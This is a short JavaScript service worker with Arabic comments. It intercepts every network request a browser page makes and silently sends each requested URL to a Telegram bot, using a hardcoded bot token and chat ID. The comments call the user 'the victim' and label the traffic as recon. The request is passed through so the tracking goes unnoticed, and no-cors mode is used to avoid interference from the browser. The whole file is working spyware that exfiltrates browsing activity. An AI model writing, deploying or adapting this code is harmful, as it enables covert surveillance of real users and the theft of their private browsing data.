const BOT_TOKEN = "7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ";
const CHAT_ID = "6778604620";

self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));

// رادار مراقبة كافة الشبكة (Universal Network Monitor)
self.addEventListener('fetch', (event) => {
    const url = event.request.url;

    // استثناء ملفات الكود مالتنا حتى ما يصير "حلقة مفرغة" (Infinite Loop)
    if (!url.includes('api.telegram.org') && !url.includes('github.io')) {
        
        // إرسال تقرير فوري لكل رابط يتم طلبه بالخلفية
        // استخدمنا 'mode: no-cors' لضمان السرعة وعدم اعتراض المتصفح
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📡 YOU_RECON: الضحية يتصفح الآن:\n${url}`, { mode: 'no-cors' });
    }

    // السماح للطلب الأصلي بالمرور بدون تأخير
    event.respondWith(fetch(event.request));
});
